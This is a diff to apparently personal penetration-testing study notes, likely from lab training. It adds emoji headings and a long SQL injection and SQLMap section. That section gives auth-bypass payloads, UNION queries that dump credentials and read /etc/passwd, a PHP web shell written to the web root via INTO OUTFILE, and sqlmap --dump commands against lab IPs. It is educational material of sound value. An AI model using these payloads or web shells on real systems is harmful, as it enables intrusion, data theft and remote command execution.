@@ -49,7 +49,7 @@ Now let's attempt to discover and list the files and directories within a web se
 * goBuster
 
 
-# **NMAP**
+# **NMAP 🛠**
 
 ## **what is it**
 
@@ -301,7 +301,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
 | open/filtered | If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port. |
 | closed/filtered | This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall. |
 
-# **NETCAT**
+# **NETCAT 🛠**
 
 ## What is it
 
@@ -329,7 +329,7 @@ Breaking down the command:
 - `22`: This is the port number you want to connect to. In this case, it's port `22`, which is typically used for SSH connections.
 
 💡 ***You can also specify the source port your nc request should be coming from with **-p X**, where X is the port #***
-# FTP
+# **FTP 🗃**
 
 ## What is it
 
@@ -375,11 +375,11 @@ end with
 
 `exit`
 
-# **SMB**
+# **SMB 🤝**
 
 ## What is it
 
-stands for **Sever Message Block**
+SMB is service 🤝 , standING for **Sever Message Block**
 
 - allows users and administrators to share folders and make them accessible remotely by other users
 - Prevalent vector in windows machines
@@ -553,7 +553,7 @@ Found: ns3.inlanefreight.com
 ===============================================================
 ```
 
-# **cURL**
+# **cURL 🛠**
 
 ## What is it
 
@@ -586,7 +586,7 @@ Link: <https://www.inlanefreight.com/>; rel=shortlink
 Content-Type: text/html; charset=UTF-8
 ```
 
-# **EYEWITNESS**
+# **EYEWITNESS 🛠**
 
 ## What is it:
 
@@ -596,7 +596,7 @@ EyeWitness is designed to run on **Kali** Linux. It will auto detect the file yo
 
 See [github repo](https://github.com/RedSiege/EyeWitness)
 
-# **Whatweb**
+# **Whatweb 🛠**
 
 ## what is it:
 
@@ -616,7 +616,7 @@ http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cro
 
 ```
 
-# **Searchsploit**
+# **Searchsploit 🛠**
 
 ## What is it:
 
@@ -664,7 +664,7 @@ the output above means:
     subdirectory, and the filename is "45233.py". This is a Python script
     targeting a remote vulnerability.
 
-# **METASPLOIT FRAMEWORK  (MF)**
+# **METASPLOIT FRAMEWORK  (MF) 🐙**
 
 
 ## What is it:
@@ -807,7 +807,7 @@ what are you searching for? could be
 
 For ex in HTB web exploit chall, the exploit had FILEPATH as default /**etc/passords** but the file you wanted was actually at **/flag.txt** (As specified in the excercie description) so again pay attention frien 🙂
 
-# **SHELLS**
+# **SHELLS 🐚**
 
 ## what is it:
 
@@ -1097,7 +1097,7 @@ curl http://SERVER_IP:PORT/shell.php?cmd=**id**
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-# **USEFUL LINKS**
+# **USEFUL LINKS 🔗**
 
 - Link dump
 
@@ -1131,7 +1131,7 @@ Linux  [GTFOBins](https://gtfobins.github.io/)
 
 Windowns [LOLBAS](https://lolbas-project.github.io/#)
 
-# QUICK LINUX CHEATSHEET
+# **QUICK LINUX CHEATSHEET 💡**
 
 `dpkg -l`    see what software is instaled on system
 
@@ -1155,7 +1155,7 @@ OR
 
 `echo "new content" | tee -a filename`
 
-# **SSH**
+# **SSH 🔐**
 
 ## What is it:
 
@@ -1166,7 +1166,7 @@ Which stands for **Secure Shell**
 
 **If you have read permission** to the root folder, (check using command `ls -l <file-name>`) then read their  hidden  ********.ssh******** folder and read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`
 
-# TRANSFERING FILES
+# **TRANSFERING FILES  📬**
 
 **Transfer files TO and FROM a remote**
 
@@ -1249,7 +1249,7 @@ With `md5sum` command:
 321de1d7e7c3735838890a72c9ae7d1d shell
 ```
 
-# **CeWL**
+# **CeWL 🔐**
 
 ## What is it:
 
@@ -1261,6 +1261,637 @@ CeWL is a ruby app which spiders a given URL to a specified depth, optionally fo
 
 See [Github repo](https://github.com/digininja/CeWL)
 
-# SQLi
+# **SQLi  💉**
+
+## What is it:
+
+A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database.
+
+**Impact**
+
+ - Retrieve secret/sensitive information that should not be visible to us, like user logins and passwords or credit card information
+ - Subvert the intended web application logic. The most common example of this is bypassing login without passing a valid pair of username and password credentials
+
+## SQL Basics
+
+***The following is executed on a MySQL DB***
+
+* Log into a MySQL DB Server :
+
+`mysql -u root -p`  ( or `mysql -u root -p<password>` but should be avoided because password will stay in the history logs)
+
+Log in and specify a remote host and port using the `-h` and `-P` flags.
+
+`mysql -h <taget> -P <port-target> -u root -p`
+
+* commands:
+
+ceate a db
+`create database <db-name>`
+
+Specify which db we are using
+`use <db-name>`
+
+See all existing dbs
+`show databases`
+
+see all tables (Once you have selected a db to use)
+`show tables`
+
+Create a table:
+
+```sql
+CREATE TABLE logins (
+    id INT,
+    username VARCHAR(100),
+    password VARCHAR(100),
+    date_of_joining DATETIME
+    );
+
+```
+
+***INSERT (**C**RUD)***
+
+* In all columns
+
+`INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);`
+
+* in specific columns
+
+`INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);`
+
+* multiple values in specific columns
+
+`INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');`
+
+***SELECT (C**R**UD)***
+
+* Select all columns in a dable
+
+`SELECT * FROM table_name;`
+
+* Select specific columns in a table
+
+`SELECT column1, column2 FROM table_name;`
 
 
+***💡 To see a table schema, use `DESCRIBE <table name>`***
+
+
+***DROP (CRU**D**)***
+
+* Delete a table
+
+`DROP TABLE  <tablename>`
+
+* Delete a column
+
+`ALTER TABLE logins DROP oldColumn;`
+
+
+
+***ALTER (CR**U**D)***
+
+
+***💡 While `ALTER` is used to change a table's properties, the [UPDATE](https://dev.mysql.com/doc/refman/8.0/en/update.html) statement can be used to update specific records within a table under certain conditions***
+
+
+* add  a column
+
+`ALTER TABLE logins ADD newColumn INT;`
+
+* Rename a col
+
+`ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;`
+
+* Change data type
+
+`ALTER TABLE logins MODIFY oldColumn DATE;`
+
+***UPDATE (CR**U**D)***
+
+***💡 While `ALTER` is used to change a table's properties, the [UPDATE](https://dev.mysql.com/doc/refman/8.0/en/update.html) statement can be used to update specific records within a table under certain conditions***
+
+* Update a table under certain conditions
+
+`UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;`
+
+
+## Type of Injections
+
+### In-Band SQLi
+
+**What is it:**
+
+The output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
+
+- Union based: where we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there.
+
+- Error based: where when we can get the `PHP` or `SQL` errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query
+
+### Blind
+
+**What is it:**
+
+Here we are not getting the output printed, so we may utilize SQL logic to retrieve the output character by character.
+
+- Boolean based: Where we can use SQL conditional statements to control whether the page
+returns any output at all, 'i.e., original query response,' if our
+conditional statement returns `true`
+
+- Time based: Where we use SQL conditional statements that delay the page response if the conditional statement returns `true` using the `Sleep()` function
+
+### Out-of-band
+
+**What is it:**
+
+in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there.
+
+## Performing an SQLi
+
+### 1 - Test for vulnerability
+
+Add one of the following after the username to see if it causes errors:
+
+| Payload | URL Encoded |
+| --- | --- |
+| ' | %27 |
+| " | %22 |
+| # | %23 |
+| ; | %3B |
+| ) | %29 |
+
+***💡 Sometimes we might have to use the URL encoded version of the payload. For example when when we put the payload directly in the URL 'i.e. HTTP GET request'.***
+
+### 2 - Auth Bypass
+
+* with ***OR***
+
+Most frequent payload will be:
+
+ `OR '1'='1`
+
+ Might need to comment out the rest of the query with `--` or `#`. Try all combinations.
+
+***💡 See more SQLi auth bypass payloads at [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)***
+
+
+The goal is to return a `TRUE` response. See logic in the below diagram
+
+![Untitled]()
+
+
+***💡 ADDITIONALLY, to log in as a specific user the payload `<user>’ OR ‘1’=’1` (with nothing in the password field) worked where having the query in both USERNAME and PWD fields didnt… something to keep in mind … I guess this work if you can keep the pwd field empty? (no validation)***
+
+* With ***UNION***
+
+As seen on Hackerone and solution offered by [this kind article](https://hacker101.testerting.science/micro-cms_v2/flag0/), one can bypass Auth with a `Union` clause like this:
+
+Username field:
+
+`' UNION SELECT '123' AS password#`
+
+Password field:
+
+`123`
+
+### 3 - DB Enumeration
+
+Example of a UNION query in a SQLi vulnerable field:
+
+`SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '`
+
+The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases
+
+**❗️UNION statement requirements**
+
+- **A `UNION` statement can only operate on `SELECT` statements with an equal number of columns**
+
+A work around for this is selecting Junk data to match the number of column of the union stmt we want to work with lol like so:
+
+`SELECT 1 from passwords`
+
+Which will always return 1 as the output
+
+or
+
+`SELECT "junk" from passwords`
+
+which will always return “Junk”
+
+- **The data types of the selected columns on all positions should be THE SAME.**
+
+A work around is simply use `NULL` to fill other columns as NULL fits all data types
+
+**3(a) Find how many columns**
+
+**With ORDER BY**
+
+To find out how many columns we have, use **`ORDER BY`** for example `order by 3` . If you get an error, then it means there are 2 columns
+(If you prev didnt get an error at `order by 2`)
+
+**With UNION**
+
+The other method is to attempt a Union injection with a different number of columns until we successfully get the results back
+
+Example:
+
+`UNION select 1,2,3--`
+
+***💡 The first method always returns the results until we hit an error, while this method always gives an error until we get a success.***
+
+Also make sure to specify a location to output the result of your query!
+
+
+**(3b) Find out which db we are in**
+
+Wild guess (starting point, note that many other DB can run on these OSs)
+
+Apache, Nginx ⇒ Linux ⇒ mySQL
+
+IIS ⇒ Microsoft dbms ⇒ MSSQL
+
+
+| Payload | When to Use | Expected Output | Wrong Output |
+| --- | --- | --- | --- |
+| SELECT @@version | When we have full query output | MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1' | In MSSQL it returns MSSQL version. Error with other DBMS. |
+| SELECT POW(1,1) | When we only have numeric output | 1 | Error with other DBMS |
+| SELECT SLEEP(5) | Blind/No Output | Delays page response for 5 seconds and returns 0. | Will not delay response with other DBMS |
+
+* **INFORMATION_SCHEMA***
+
+contains metadata about the databases and tables present on the server.
+
+* **SCHEMATA**
+
+This table is located in the **information_schema** db and contains information about all databases on the server. The `SCHEMA_NAME` column contains all the database names currently present
+
+Example of enumration:
+
+`UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA--`
+
+```
+The following 3 dbs will always be present in MySQL DBs because they are default (sometimes there is a fourth one called 'sys')
+
+**| mysql              |
+| information_schema |
+| performance_schema |**
+```
+
+
+***💡 `database()` will tell you what is the **current db** we are in***
+
+
+**(3c) find out TABLES  present in the db**
+
+the `TABLES` table in the `INFORMATION_SCHEMA` db Contains information about all tables throughout the database. In this table, we will most likely be interested in `TABLE_SCHEMA` and `TABLE_NAME` columns.
+
+example:
+
+`UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'--`
+
+
+
+**(3d) find out COLUMNS present in the db**
+
+The `COLUMNS` table in the `INFORMATION_SCHEMA` db contains information about all columns present in all the databases. Here we will most likely be interested in the The `COLUMN_NAME`, `TABLE_NAME`, and `TABLE_SCHEMA` columns
+
+Example
+
+`UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'--`
+
+
+### 4 - Privilege escalation
+
+First, let’s find out our current privileges.
+
+Typically in a SQL db you would run to find out what privileges you have.
+
+```sql
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+
+```
+
+We can accomplish the same with our `UNION` injection. As such:
+
+`cn' UNION SELECT 1, user(), 3, 4-- -`
+
+or
+
+`cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`
+
+**- Find out if we have super privileges:**
+
+You ll get the info with:
+
+`SELECT super_priv FROM mysql.user`
+
+or
+
+`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`
+
+
+***💡 You can add `WHERE user="root"-- -` if there are a lot of users in the db***
+
+The output of this query will be `Y` if user has super_priv
+
+**- Find out if we can READ/WRITE:**
+
+You ll get this info with:
+
+`UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
+
+Where `FILE` is the action that interest us in the event we are looking to manipulate files.
+
+From there, we can find out if we can:
+
+**READ FILES**
+
+`UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
+
+***💡 We will only be able to read the file if the OS user running MySQL has enough privileges to read it.***
+
+
+We can even read source code for the web app:
+
+`UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`
+
+and `ctrl + u` to view it as code.
+
+**WRITE FILE**
+
+To be able to write files to the back-end server using a MySQL database, we require three things:
+
+1. User with `FILE` privilege enabled
+2. MySQL global `secure_file_priv` variable not enabled
+3. Write access to the location we want to write to on the back-end server
+
+- Check if `secure_file_priv` is NOT enabled:
+
+`secure_file_priv` is used to determine where to read/write files from.
+
+**An empty value** ⇒ Can read files from the entire file system
+
+**Null** ⇒ we cannot read/write from any directory
+
+**Enabled** ⇒ Limited to certain files ?
+
+
+***💡 MariaDB has this variable set to empty by default if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder.***
+
+find out with the command:
+
+`SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
+
+- If we indeed have write access to the target, you can write using the following command:
+
+`SELECT * from users INTO OUTFILE '/tmp/credentials';`
+
+Then go see it with: `cat /tmp/credentials`
+
+Write a file:
+
+`SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`
+
+and go see it at `cat /tmp/test.txt';`
+
+***💡 the `test.txt` file was created successfully and is owned by the `mysql` user.***
+
+### 5 - Writing a web shell with SQLi
+
+**Note**:
+To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations.
+
+Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).
+
+Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that we may write to.
+
+**Write the shell into the server**
+
+Using a `union` injection payload, I would craft the following statement to write anything into the server:
+
+`cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`
+
+Now if I want to start a shell, replacing ‘file written successfully!” with
+
+**`<?php system($_REQUEST[0]); ?>`**
+
+So now we have:
+
+**`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`**
+
+I have had instances where the code above didnt work. Instead I used:
+
+`' UNION SELECT "",'<?php system(pwd); ?>',"","","" INto outfile '/var/www/html/dashboard/shell.php'-- -`
+
+This ☝️ doesnt  give you remote execution per say but you are passing the command in the `<?php system(ENTER COMMAND HERE); ?>` and you then navigate to `url/shell.php` to see the output. Not very efficient I know lol ... but as you will find out, if there are no requirement of stealth or spead or efficiency only the result matters 😁
+
+You can pass other commands like:
+
+`' UNION SELECT "",'<?php system(dir /); ?>',"","","" INto outfile '/var/www/html/dashboard/shell5.php'-- -`
+
+that will ist the content of `\`. When you see the doc that interests you, grab it with `LOAD_FILE`
+
+***Tip:***
+
+If the attack is successful, this is how you navitgate a web shell:
+
+```
+http://<Address>/shell2.php?0=ls
+
+http://<Address>/shell2.php?0=pwd
+
+http://<Address>/shell2.php?0=ls /var/www/html
+
+http://<Address>/shell2.php?0=cat /var/www/flag.txt
+```
+
+## Mitigation
+
+Injection can be avoided by sanitizing any user input, rendering injected queries useless.
+
+There are Libraries to help you escape special characters. Libraries like:
+
+[mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)
+
+[pg_escape_string()](https://www.php.net/manual/en/function.pg-escape-string.php)
+
+
+# **SQLMap 🛠**
+
+## What is it:
+
+penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws.
+
+## How to use:
+
+`sqlmap -u "<URL>" --batch`
+
+option `-u` is used to provide the target URL, while the switch `--batch` is used for skipping any required user-input, by automatically choosing using the default option.
+
+**Deconstructing the output**
+
+```
+Eli90@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.9}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 22:26:45 /2020-09-09/
+
+[22:26:45] [INFO] testing connection to the target URL
+[22:26:45] [INFO] testing if the target URL content is stable
+[22:26:46] [INFO] **target URL content is stable [1 - see notes]**
+[22:26:46] [INFO] testing if GET parameter 'id' is dynamic
+[22:26:46] [INFO] **GET parameter 'id' appears to be dynamic [2]**
+[22:26:46] [INFO] **heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL') [3]**
+[22:26:46] [INFO] **heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks**
+[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y **[4]**
+[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:26:46] [WARNING] **reflective value(s) found and filtering out [5]**
+[22:26:46] [INFO] **GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther") [6]**
+[22:26:46] [INFO] testing 'Generic inline queries'
+[22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+...SNIP...
+[22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[22:26:46] [INFO] testing 'MySQL inline queries'
+[22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
+...SNIP...
+[22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[22:26:56] [INFO] target URL appears to have 3 columns in query
+[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 8814=8814
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
+---
+[22:26:56] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL >= 5.0
+[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'
+
+[*] ending @ 22:26:57 /2020-09-09/
+```
+
+[1] - means no major changes between responses when sending identical request: This is good for automation
+
+[2] - means a change in this parameter would result in a change of the output
+
+[3]
+
+[4] This basically means running all SQL injection payloads for that specific DBMS, while if no DBMS were detected, only top payloads would be tested.
+
+[5] a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk
+
+[6] This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding
+
+…
+
+**SQLMap on an HTTP Request**
+
+**web request with parameters inside**
+
+**EASIEST** ⇒ Get the URL using inspect/network tab and copy as cURL
+
+then craft the request as below:
+
+`sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'`
+
+there has to be either a parameter value that could be assessed for
+SQLi vulnerability or specialized options/switches for automatic
+parameter finding (e.g. `--crawl`, `--forms` or `-g`)
+
+
+
+When dealing with **POST** requests, one can craft a request as this:
+
+`sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`
+
+Where parameters `uid` and `name` will be tested for SQLi vulnerability
+
+
+***💡 if we are sure for example, that  parameter `uid` is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using `-p uid`  OR Specify with a `*` like this: `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`***
+
+
+And then for **PUT** requests, we can use the `--method` switch as follow:
+
+`sqlmap -u www.target.com --data='id=1' --method PUT`
+
+**Sending FULL request**
+
+(If we need to specify lots of things in the request like heards, cookies, etc. It also helps when dealing with Json  bodies)
+
+1- intercept the request of interest in Burp,save it to file
+
+2- start the test with `-r` with —
+
+`sqlmap -r req.txt`
+
+**HANDLING ERRORS**
+
+Use `-parse-erros` switch to display error when the program runs, `-v` to display as much info as possible and `-t <file/path>`  to store traffic for better examination.
+
+---
+
+**Running SQLMap on an HTTP Request exercises:**
+
+ - Detect and exploit SQLi vulnerability in POST parameter `id`
+
+`sqlmap -u "94.237.59.185:32382/case2.php" --data 'id=1' --batch --dump`
+
+ - Detect and exploit SQLi vulnerability in Cookie value `id=1`
+
+`sqlmap sqlmap -u http://94.237.59.206:52596/case3.php --cookie="id=*" --batch --dump`
+
+(will also work with one sqlmap hmm)
+
+ - Detect and exploit SQLi vulnerability in JSON data `{"id": 1}`
+
+***💡 Need to capture a request in burpsuite for this!!!***
+
+`sqlmap -r req.txt --batch --dump`
+
+**Info on switches:**
+
+- `--batch` is defined in the command, the tool uses a default value to proceed without asking the user.
+
+- `--dump` will tell SQLmap to grab all the data from the  table and display it (Noice eh?)
+
+- One is doing a permanent delete of the session (`--flush-session`),
+
+- the other is ignoring the session (`--fresh-queries`). You should not use them together because it doesn't make any sense to do that
+
+- `--crawl` Lets Sqlmap look for parameters to inject
+
+- `--parse-errors`  parse the DBMS errors (if any) and displays them as part of the program run
+
+- `-t /tmp/traffic.txt`   (or any file name of your choosing) - This will store all sent and received HTTP requests in the specified file.
+
+- `-v` Verbosity option
